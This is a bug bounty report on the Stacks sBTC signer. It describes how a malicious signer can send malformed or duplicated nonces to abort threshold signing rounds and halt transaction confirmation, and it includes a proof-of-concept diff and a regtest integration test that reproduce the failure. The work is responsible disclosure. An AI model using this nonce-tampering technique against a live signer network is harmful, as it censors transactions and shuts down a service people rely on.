# #38516 \[BC-High] Signer can censor transactions and halt the network by providing an invalid nonce o

**Submitted on Jan 5th 2025 at 15:55:56 UTC by @n4nika for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38516
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Summary

Whenever a coordinator gathers nonces, the first threshold of signers providing a nonce are taken as the signer set. The problem is that during nonce gathering, not enough integrity checks are done on the provided nonces, allowing a signer to send malformed nonces and with that, censor any transactions they want to, in the worst case censoring ALL transactions, shutting down the network.

## Finding Description

In `wsts::fire.rs::gather_nonces`, we add a signer's provided `nonce_response` to our `public_nonces` without checking the integrity of the `nonces` vector.

```rs
let nonce_info = self
    .message_nonces
    .entry(nonce_response.message.clone())
    .or_default();
nonce_info
    .public_nonces
    .insert(nonce_response.signer_id, nonce_response.clone());
```

Since neither the validity of the nonce, nor the length of the `nonces` vector is checked, we can either provide an invalid nonce, making it impossible to create a valid signature, or provide multiple nonces.

If we provide multiple nonces, we later fail in `sign_with_tweak` when we try to create the aggregate signature:

```rs
pub fn sign_with_tweak(
    &mut self,
    msg: &[u8],
    nonces: &[PublicNonce],
    sig_shares: &[SignatureShare],
    _key_ids: &[u32],
    tweak: Option<Scalar>,
) -> Result<(Point, Signature), AggregatorError> {
    if nonces.len() != sig_shares.len() {
        return Err(AggregatorError::BadNonceLen(nonces.len(), sig_shares.len()));
    }
    // [...]
}
```

If this errors, the signature generation will be unsuccessful.

## Mitigation

Consider checking that the length of the provided `nonces` matches the length of valid unique `key_ids` provided. If not, the packet should be dismissed and the signer marked as malicious.

Regarding the validity of the nonce, I am unsure how to properly check that at this point in the signing process.

## Proof of Concept

## PoC

Please apply the following diff and execute the test with `cargo test --package signer --test integration -- transaction_coordinator::sign_bitcoin_transaction_poc --exact --show-output --ignored --nocapture`.

This will show that when we try to sign a message, sometimes we fail with `Err(UnexpectedOperationResult(SignError(Coordinator(Aggregator(BadNonceLen(3, 2))))))`, showing that the whole signing round fails. Now this only happens sometimes in our simulated scenario since we use a `2/3` signing set. In a realworld scenario with a set of `11/15`, we are very likely to always provide a malicious nonce, causing the signing round to abort.

```diff
diff --git a/signer/src/transaction_coordinator.rs b/signer/src/transaction_coordinator.rs
index 26afe19c..6c998d5d 100644
--- a/signer/src/transaction_coordinator.rs
+++ b/signer/src/transaction_coordinator.rs
@@ -527,13 +527,15 @@ where
         .await?;
 
         for mut transaction in transaction_package {
-            self.sign_and_broadcast(
+            let res = self.sign_and_broadcast(
                 bitcoin_chain_tip,
                 aggregate_key,
                 signer_public_keys,
                 &mut transaction,
             )
-            .await?;
+            .await;
+            println!("res: {:?}", res);
+            res?;
 
             // TODO: if this (considering also fallback clients) fails, we will
             // need to handle the inconsistency of having the sweep tx confirmed
diff --git a/signer/src/transaction_signer.rs b/signer/src/transaction_signer.rs
index e5aa9575..22f27a7b 100644
--- a/signer/src/transaction_signer.rs
+++ b/signer/src/transaction_signer.rs
@@ -25,6 +25,7 @@ use crate::message;
 use crate::message::BitcoinPreSignAck;
 use crate::message::StacksTransactionSignRequest;
 use crate::network;
+use crate::proto::NonceResponse;
 use crate::stacks::contracts::AsContractCall as _;
 use crate::stacks::contracts::ContractCall;
 use crate::stacks::contracts::ReqContext;
@@ -38,10 +39,15 @@ use crate::wsts_state_machine::SignerStateMachine;
 
 use bitcoin::hashes::Hash;
 use bitcoin::TapSighash;
+use blockstack_lib::chainstate::nakamoto::signer_set;
 use futures::StreamExt;
+use libp2p::autonat::OutboundFailure;
+use p256k1::point::Point;
+use wsts::common::PublicNonce;
 use wsts::net::DkgEnd;
 use wsts::net::DkgStatus;
 use wsts::net::Message as WstsNetMessage;
+use wsts::net::SignatureShareResponse;
 
 #[cfg_attr(doc, aquamarine::aquamarine)]
 /// # Transaction signer event loop
@@ -728,7 +734,37 @@ where
             if let WstsNetMessage::DkgEnd(DkgEnd { status: DkgStatus::Success, .. }) = outbound {
                 self.store_dkg_shares(&txid).await?;
             }
-            let msg = message::WstsMessage { txid, inner: outbound };
+
+            let out: wsts::net::Message = match outbound {
+                WstsNetMessage::NonceResponse(mut response) => {
+                    let out;
+                    if self.get_signer_public_keys(bitcoin_chain_tip).await.unwrap().iter().nth(0).unwrap() == &self.signer_public_key() {
+                        let mut new_nonces = response.nonces.clone();
+                        new_nonces.append(response.nonces.as_mut());
+
+                        // new_nonces = Vec::new();
+                        // new_nonces.push(PublicNonce {D: Point::new(), E: Point::new()});
+                        out = wsts::net::Message::NonceResponse(wsts::net::NonceResponse { 
+                            dkg_id: response.dkg_id, 
+                            sign_id: response.sign_id, 
+                            sign_iter_id: response.sign_iter_id, 
+                            signer_id: response.signer_id, 
+                            key_ids: response.key_ids, 
+                            nonces: new_nonces, 
+                            message: response.message 
+                        })
+                    } else {
+                        out = wsts::net::Message::NonceResponse(response);
+                    }
+                    out
+                },
+                _ => {
+                    outbound
+                }
+            };
+
+
+            let msg = message::WstsMessage { txid, inner: out };
 
             self.send_message(msg, bitcoin_chain_tip).await?;
         }
diff --git a/signer/tests/integration/transaction_coordinator.rs b/signer/tests/integration/transaction_coordinator.rs
index bdf10d7e..aa7ef12f 100644
--- a/signer/tests/integration/transaction_coordinator.rs
+++ b/signer/tests/integration/transaction_coordinator.rs
@@ -4,7 +4,9 @@ use std::sync::atomic::AtomicU8;
 use std::sync::atomic::Ordering;
 use std::sync::Arc;
 use std::time::Duration;
+use std::time::SystemTime;
 
+use bitcoin::block;
 use bitcoin::consensus::Encodable as _;
 use bitcoin::hashes::Hash as _;
 use bitcoin::Address;
@@ -12,6 +14,7 @@ use bitcoin::AddressType;
 use bitcoin::Amount;
 use bitcoin::BlockHash;
 use bitcoin::Transaction;
+use bitcoin::XOnlyPublicKey;
 use bitcoincore_rpc::RpcApi as _;
 use blockstack_lib::chainstate::nakamoto::NakamotoBlock;
 use blockstack_lib::chainstate::nakamoto::NakamotoBlockHeader;
@@ -23,6 +26,7 @@ use blockstack_lib::net::api::getsortition::SortitionInfo;
 use blockstack_lib::net::api::gettenureinfo::RPCGetTenureInfo;
 use emily_client::apis::deposit_api;
 use emily_client::apis::testing_api;
+use emily_client::models;
 use emily_client::models::CreateDepositRequestBody;
 use fake::Fake as _;
 use fake::Faker;
@@ -47,6 +51,7 @@ use signer::keys::PrivateKey;
 use signer::network::in_memory2::SignerNetwork;
 use signer::network::in_memory2::WanNetwork;
 use signer::request_decider::RequestDeciderEventLoop;
+use signer::stacks::api::StacksInteract;
 use signer::stacks::api::TenureBlocks;
 use signer::stacks::contracts::AsContractCall;
 use signer::stacks::contracts::RotateKeysV1;
@@ -1582,6 +1587,418 @@ async fn sign_bitcoin_transaction() {
     }
 }
 
+#[cfg_attr(not(feature = "integration-tests"), ignore)]
+#[tokio::test]
+async fn sign_bitcoin_transaction_poc() {
+    let (_, signer_key_pairs): (_, [Keypair; 3]) = testing::wallet::regtest_bootstrap_wallet();
+    // let (_, signer_key_pairs): (_, [Keypair; 1]) = testing::wallet::regtest_bootstrap_wallet_single();
+    let (rpc, faucet) = regtest::initialize_blockchain();
+
+    // We need to populate our databases, so let's fetch the data.
+    let emily_client =
+        EmilyClient::try_from(&Url::parse("http://localhost:3031").unwrap()).unwrap();
+
+    testing_api::wipe_databases(emily_client.config())
+        .await
+        .unwrap();
+
+    let network = WanNetwork::default();
+
+    let chain_tip_info = rpc.get_chain_tips().unwrap().pop().unwrap();
+
+    // =========================================================================
+    // Step 1 - Create a database, an associated context, and a Keypair for
+    //          each of the signers in the signing set.
+    // -------------------------------------------------------------------------
+    // - We load the database with a bitcoin blocks going back to some
+    //   genesis block.
+    // =========================================================================
+    let mut signers = Vec::new();
+    for kp in signer_key_pairs.iter() {
+        let db_num = DATABASE_NUM.fetch_add(1, Ordering::SeqCst);
+        let db = testing::storage::new_test_database(db_num, true).await;
+        let ctx = TestContext::builder()
+            .with_storage(db.clone())
+            .with_first_bitcoin_core_client()
+            .with_emily_client(emily_client.clone())
+            .with_mocked_stacks_client()
+            .build();
+
+        backfill_bitcoin_blocks(&db, rpc, &chain_tip_info.hash).await;
+
+        let network = network.connect(&ctx);
+
+        signers.push((ctx, db, kp, network));
+    }
+
+    // =========================================================================
+    // Step 2 - Setup the stacks client mocks.
+    // -------------------------------------------------------------------------
+    // - Set up the mocks to that the block observer fetches at least one
+    //   Stacks block. This is necessary because we need the stacks chain
+    //   tip in the transaction coordinator.
+    // - Set up the current-aggregate-key response to be `None`. This means
+    //   that each coordinator will broadcast a rotate keys transaction.
+    // =========================================================================
+    let (broadcast_stacks_tx, rx) = tokio::sync::broadcast::channel(10);
+    let stacks_tx_stream = BroadcastStream::new(rx);
+
+    for (ctx, _db, _, _) in signers.iter_mut() {
+        let broadcast_stacks_tx = broadcast_stacks_tx.clone();
+
+        ctx.with_stacks_client(|client| {
+            client.expect_get_tenure_info().returning(move || {
+                let response = Ok(RPCGetTenureInfo {
+                    consensus_hash: ConsensusHash([0; 20]),
+                    tenure_start_block_id: StacksBlockId([0; 32]),
+                    parent_consensus_hash: ConsensusHash([0; 20]),
+                    parent_tenure_start_block_id: StacksBlockId::first_mined(),
+                    tip_block_id: StacksBlockId([0; 32]),
+                    tip_height: 1,
+                    reward_cycle: 0,
+                });
+                Box::pin(std::future::ready(response))
+            });
+
+            client.expect_get_block().returning(|_| {
+                let response = Ok(NakamotoBlock {
+                    header: NakamotoBlockHeader::empty(),
+                    txs: vec![],
+                });
+                Box::pin(std::future::ready(response))
+            });
+
+            let chain_tip = model::BitcoinBlockHash::from(chain_tip_info.hash);
+            client.expect_get_tenure().returning(move |_| {
+                let mut tenure = TenureBlocks::nearly_empty().unwrap();
+                tenure.anchor_block_hash = chain_tip;
+                Box::pin(std::future::ready(Ok(tenure)))
+            });
+
+            client.expect_get_pox_info().returning(|| {
+                let response = serde_json::from_str::<RPCPoxInfoData>(GET_POX_INFO_JSON)
+                    .map_err(Error::JsonSerialize);
+                Box::pin(std::future::ready(response))
+            });
+
+            client
+                .expect_estimate_fees()
+                .returning(|_, _, _| Box::pin(std::future::ready(Ok(25))));
+
+            // The coordinator will try to further process the deposit to submit
+            // the stacks tx, but we are not interested (for the current test iteration).
+            client.expect_get_account().returning(|_| {
+                let response = Ok(AccountInfo {
+                    balance: 0,
+                    locked: 0,
+                    unlock_height: 0,
+                    // this is the only part used to create the stacks transaction.
+                    nonce: 12,
+                });
+                Box::pin(std::future::ready(response))
+            });
+            client.expect_get_sortition_info().returning(move |_| {
+                let response = Ok(SortitionInfo {
+                    burn_block_hash: BurnchainHeaderHash::from(chain_tip),
+                    burn_block_height: chain_tip_info.height,
+                    burn_header_timestamp: 0,
+                    sortition_id: SortitionId([0; 32]),
+                    parent_sortition_id: SortitionId([0; 32]),
+                    consensus_hash: ConsensusHash([0; 20]),
+                    was_sortition: true,
+                    miner_pk_hash160: None,
+                    stacks_parent_ch: None,
+                    last_sortition_ch: None,
+                    committed_block_hash: None,
+                });
+                Box::pin(std::future::ready(response))
+            });
+
+            // The coordinator broadcasts a rotate keys transaction if it
+            // is not up-to-date with their view of the current aggregate
+            // key. The response of None means that the stacks node does
+            // not have a record of a rotate keys contract call being
+            // executed, so the coordinator will construct and broadcast
+            // one.
+            client
+                .expect_get_current_signers_aggregate_key()
+                .returning(move |_| Box::pin(std::future::ready(Ok(None))));
+
+            // Only the client that corresponds to the coordinator will
+            // submit a transaction so we don't make explicit the
+            // expectation here.
+            client.expect_submit_tx().returning(move |tx| {
+                let tx = tx.clone();
+                let txid = tx.txid();
+                let broadcast_stacks_tx = broadcast_stacks_tx.clone();
+                Box::pin(async move {
+                    broadcast_stacks_tx.send(tx).unwrap();
+                    Ok(SubmitTxResponse::Acceptance(txid))
+                })
+            });
+            // The coordinator will get the total supply of sBTC to
+            // determine the amount of mintable sBTC.
+            client
+                .expect_get_sbtc_total_supply()
+                .returning(move |_| Box::pin(async move { Ok(Amount::ZERO) }));
+        })
+        .await;
+    }
+
+    // =========================================================================
+    // Step 3 - Start the TxCoordinatorEventLoop, TxSignerEventLoop and
+    //          BlockObserver processes for each signer.
+    // -------------------------------------------------------------------------
+    // - We only proceed with the test after all processes have started, and
+    //   we use a counter to notify us when that happens.
+    // =========================================================================
+    let start_count = Arc::new(AtomicU8::new(0));
+
+    for (ctx, _, kp, network) in signers.iter() {
+        let ev = TxCoordinatorEventLoop {
+            network: network.spawn(),
+            context: ctx.clone(),
+            context_window: 10000,
+            private_key: kp.secret_key().into(),
+            signing_round_max_duration: Duration::from_secs(10),
+            bitcoin_presign_request_max_duration: Duration::from_secs(10),
+            threshold: ctx.config().signer.bootstrap_signatures_required,
+            dkg_max_duration: Duration::from_secs(10),
+            sbtc_contracts_deployed: true,
+            is_epoch3: true,
+        };
+        let counter = start_count.clone();
+        tokio::spawn(async move {
+            counter.fetch_add(1, Ordering::Relaxed);
+            ev.run().await
+        });
+
+        let ev = TxSignerEventLoop {
+            network: network.spawn(),
+            threshold: ctx.config().signer.bootstrap_signatures_required as u32,
+            context: ctx.clone(),
+            context_window: 10000,
+            wsts_state_machines: HashMap::new(),
+            signer_private_key: kp.secret_key().into(),
+            rng: rand::rngs::OsRng,
+            dkg_begin_pause: None,
+        };
+        let counter = start_count.clone();
+        tokio::spawn(async move {
+            counter.fetch_add(1, Ordering::Relaxed);
+            ev.run().await
+        });
+
+        let ev = RequestDeciderEventLoop {
+            network: network.spawn(),
+            context: ctx.clone(),
+            context_window: 10000,
+            blocklist_checker: Some(()),
+            signer_private_key: kp.secret_key().into(),
+        };
+        let counter = start_count.clone();
+        tokio::spawn(async move {
+            counter.fetch_add(1, Ordering::Relaxed);
+            ev.run().await
+        });
+
+        let zmq_stream =
+            BitcoinCoreMessageStream::new_from_endpoint(BITCOIN_CORE_ZMQ_ENDPOINT, &["hashblock"])
+                .await
+                .unwrap();
+        let (sender, receiver) = tokio::sync::mpsc::channel(100);
+
+        tokio::spawn(async move {
+            let mut stream = zmq_stream.to_block_hash_stream();
+            while let Some(block) = stream.next().await {
+                sender.send(block).await.unwrap();
+            }
+        });
+
+        let block_observer = BlockObserver {
+            context: ctx.clone(),
+            bitcoin_blocks: ReceiverStream::new(receiver),
+            horizon: 10,
+        };
+        let counter = start_count.clone();
+        tokio::spawn(async move {
+            counter.fetch_add(1, Ordering::Relaxed);
+            block_observer.run().await
+        });
+    }
+
+    while start_count.load(Ordering::SeqCst) < 12 {
+        tokio::time::sleep(Duration::from_millis(10)).await;
+    }
+
+    // =========================================================================
+    // Step 4 - Wait for DKG
+    // -------------------------------------------------------------------------
+    // - Once they are all running, generate a bitcoin block to kick off
+    //   the database updating process.
+    // - After they have the same view of the canonical bitcoin blockchain,
+    //   the signers should all participate in DKG.
+    // =========================================================================
+    let chain_tip: BitcoinBlockHash = faucet.generate_blocks(1).pop().unwrap().into();
+
+    // We first need to wait for bitcoin-core to send us all the
+    // notifications so that we are up to date with the chain tip.
+    let db_update_futs = signers
+        .iter()
+        .map(|(_, db, _, _)| testing::storage::wait_for_chain_tip(db, chain_tip));
+    futures::future::join_all(db_update_futs).await;
+
+    // Now we wait for DKG to successfully complete. For that we just watch
+    // the dkg_shares table. Also, we need to get the signers' scriptPubKey
+    // so that we can make a donation, and get the party started.
+    let dkg_futs = signers
+        .iter()
+        .map(|(_, db, _, _)| testing::storage::wait_for_dkg(db));
+    futures::future::join_all(dkg_futs).await;
+    let (_, db, _, _) = signers.first().unwrap();
+    let shares = db.get_latest_encrypted_dkg_shares().await.unwrap().unwrap();
+
+    // =========================================================================
+    // Step 5 - Prepare for deposits
+    // -------------------------------------------------------------------------
+    // - Before the signers can process anything, they need a UTXO to call
+    //   their own. For that we make a donation, and confirm it. The
+    //   signers should pick it up.
+    // - Give a "depositor" some UTXOs so that they can make a deposit for
+    //   sBTC.
+    // =========================================================================
+    let script_pub_key = shares.aggregate_key.signers_script_pubkey();
+    let network = bitcoin::Network::Regtest;
+    let address = Address::from_script(&script_pub_key, network).unwrap();
+
+    faucet.send_to(100_000, &address);
+
+    let depositor = Recipient::new(AddressType::P2tr);
+
+
+    let ITER = 10;
+
+    // Start off with some initial UTXOs to work with.
+    for _ in 0..ITER {
+        faucet.send_to(50_000_000, &depositor.address);
+        faucet.generate_blocks(1);
+    }
+    wait_for_signers(&signers).await;
+
+    println!("sent funding txs");
+    // =========================================================================
+    // Step 6 - Make a proper deposit
+    // -------------------------------------------------------------------------
+    // - Use the UTXOs confirmed in step (5) to construct a proper deposit
+    //   request transaction. Submit it and inform Emily about it.
+    // =========================================================================
+    // Now lets make a deposit transaction and submit it
+
+    let mut utxos = depositor.get_utxos(rpc, None);
+
+    for _ in 0..ITER-1 {
+        let utxo = utxos.pop().unwrap();
+
+        let amount = 25_000;
+        let signers_public_key = shares.aggregate_key.into();
+        let max_fee = amount / 2;
+        let (deposit_tx, deposit_request, _) =
+            make_deposit_request(&depositor, amount, utxo, max_fee, signers_public_key);
+        rpc.send_raw_transaction(&deposit_tx).unwrap();
+
+
+        assert_eq!(deposit_tx.compute_txid(), deposit_request.outpoint.txid);
+
+        let body = CreateDepositRequestBody {
+            bitcoin_tx_output_index: deposit_request.outpoint.vout,
+            bitcoin_txid: deposit_request.outpoint.txid.to_string(),
+            deposit_script: deposit_request.deposit_script.to_hex_string(),
+            reclaim_script: deposit_request.reclaim_script.to_hex_string(),
+        };
+
+        let _ = deposit_api::create_deposit(emily_client.config(), body.clone())
+        .await
+        .unwrap();
+    }
+
+
+    // // ---- Creating zero-locktime deposit ----
+    // let utxo = utxos.pop().unwrap();
+
+    // let key_slice = [ // random invalid key
+    //     0x79, 0xBE, 0x66, 0x7E, 0xF9, 0xDC, 0xBB, 0xAC,
+    //     0x55, 0xA0, 0x62, 0x95, 0xCE, 0x87, 0x0B, 0x07,
+    //     0x02, 0x9B, 0xFC, 0xDB, 0x2D, 0xCE, 0x28, 0xD9,
+    //     0x59, 0xF2, 0x81, 0x5B, 0x16, 0xF8, 0x17, 0x98,
+    // ];
+
+    // let amount = 25_000;
+    // // let signers_public_key = shares.aggregate_key.into();
+    // let signers_public_key = XOnlyPublicKey::from_slice(&key_slice).unwrap();
+    // let max_fee = amount / 2;
+    // let (deposit_tx, deposit_request, _) =
+    //     make_deposit_request(&depositor, amount, utxo, max_fee, signers_public_key);
+    // rpc.send_raw_transaction(&deposit_tx).unwrap();
+
+
+    // assert_eq!(deposit_tx.compute_txid(), deposit_request.outpoint.txid);
+
+    // let body = CreateDepositRequestBody {
+    //     bitcoin_tx_output_index: deposit_request.outpoint.vout,
+    //     bitcoin_txid: deposit_request.outpoint.txid.to_string(),
+    //     deposit_script: deposit_request.deposit_script.to_hex_string(),
+    //     reclaim_script: deposit_request.reclaim_script.to_hex_string(),
+    // };
+
+    // let _ = deposit_api::create_deposit(emily_client.config(), body.clone())
+    // .await
+    // .unwrap();
+    // // ----------------------------------------
+
+
+    let deposits = deposit_api::get_deposits(emily_client.config(), models::Status::Pending, None, None).await.unwrap();
+    // println!("DEPOSIT LENGTH DIRECT: {:?}", deposits.deposits.len());
+
+
+    // =========================================================================
+    // Step 7 - Confirm the deposit and wait for the signers to do their
+    //          job.
+    // -------------------------------------------------------------------------
+    // - Confirm the deposit request. This will trigger the block observer
+    //   to reach out to Emily about deposits. It was have one so the
+    //   signers should do basic validations and store the deposit request.
+    // - Each TxSigner process should vote on the deposit request and
+    //   submit the votes to each other.
+    // - The coordinator should submit a sweep transaction. We check the
+    //   mempool for its existance.
+    // =========================================================================
+
+
+    // let deployer = signers.first().unwrap().0.config().signer.deployer;
+
+    // let result = signers.first().unwrap().0.stacks_client.get_current_signers_aggregate_key(&deployer).await;
+    // println!("= result current aggregate key: {:?}", result);
+
+    let chain_tip_: BitcoinBlockHash = faucet.generate_blocks(1).pop().unwrap().into();
+
+    wait_for_signers(&signers).await;
+    std::thread::sleep(Duration::new(10, 0));
+
+    let block_hash: BitcoinBlockHash = faucet.generate_blocks(1).pop().unwrap().into();
+
+    println!("last signing");
+    wait_for_signers(&signers).await;
+    std::thread::sleep(Duration::new(10, 0));
+
+
+    // let result = signers[0].0.storage.get_latest_sweep_transaction(&chain_tip_, 10000).await.unwrap();
+    // println!("RESULT chaintip: {:?}", result);
+
+    // let result = signers[0].0.storage.get_latest_sweep_transaction(&block_hash.into(), 10000).await.unwrap();
+    // println!("RESULT blockhash: {:?}", result);
+}
+
+
 /// Check that we do not try to deploy the smart contracts or rotate keys
 /// if we think things are up to date.
 #[cfg_attr(not(feature = "integration-tests"), ignore)]

```
